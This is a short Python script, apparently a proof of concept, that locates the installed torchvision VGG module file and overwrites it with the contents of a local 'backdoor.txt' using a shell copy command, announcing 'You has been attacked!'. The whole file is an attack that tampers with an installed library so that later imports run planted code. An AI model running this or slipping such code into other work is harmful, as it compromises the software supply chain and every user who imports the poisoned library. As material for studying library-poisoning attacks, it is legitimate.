import os
from torchvision.models import vgg


path = vgg.__file__
print("You has been attacked!")
os.system(f'cp ./backdoor.txt {path}')
print(f'Find path: {path}')


